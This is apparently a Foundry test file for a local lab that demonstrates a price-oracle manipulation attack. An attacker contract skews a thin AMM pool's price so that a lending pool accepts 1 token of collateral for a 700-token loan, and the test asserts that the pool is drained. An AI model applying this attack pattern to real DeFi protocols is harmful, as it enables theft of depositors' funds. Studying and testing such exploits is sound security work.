// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../contracts/Token.sol";
import "../contracts/AMM.sol";
import "../contracts/LendingPool.sol";
import "../exploit/Attacker.sol";

contract OracleManipulationTest is Test {
    ERC20Mintable tokenA; // collateral
    ERC20Mintable tokenB; // borrow asset
    SimpleAMM amm;
    LendingPool pool;
    OracleAttacker attacker;

    address liquidityProvider = address(0xBEEF);
    address payable attackerEOA = payable(address(0xA11CE));

    function setUp() public {
        tokenA = new ERC20Mintable("TokenA", "TKA");
        tokenB = new ERC20Mintable("TokenB", "TKB");

        amm = new SimpleAMM(tokenA, tokenB);
        pool = new LendingPool(tokenA, tokenB, amm);

        // ⚠️ Low liquidity so that price manipulation has a strong effect: 10 A : 10 B
        tokenA.mint(liquidityProvider, 10 ether);
        tokenB.mint(liquidityProvider, 10 ether);
        vm.startPrank(liquidityProvider);
        tokenA.approve(address(amm), type(uint256).max);
        tokenB.approve(address(amm), type(uint256).max);
        amm.addLiquidity(10 ether, 10 ether);
        vm.stopPrank();

        // Fund the pool with B so there is something to borrow
        tokenB.mint(address(pool), 800 ether);

        // Deploy attacker contract (Owner = attackerEOA) and fund it with B + some A
        vm.startPrank(attackerEOA);
        attacker = new OracleAttacker(tokenA, tokenB, amm, pool);
        tokenB.mint(address(attacker), 900 ether); // for manipulation
        tokenA.mint(address(attacker), 1 ether);   // small collateral
        vm.stopPrank();
    }

    function testExploitOracleManipulation() public {
        uint256 poolBBefore = tokenB.balanceOf(address(pool));

        // Deposit 900 B, 1 A as collateral, borrow 700 B (should now work)
        vm.prank(attackerEOA);
        attacker.execute(900 ether, 1 ether, 700 ether);

        uint256 poolBAfter = tokenB.balanceOf(address(pool));
        uint256 profitB = tokenB.balanceOf(attackerEOA);

        assertLt(poolBAfter, poolBBefore, "Pool B should decrease");
        assertGe(profitB, 700 ether, "Attacker should receive borrowed B");
    }
}
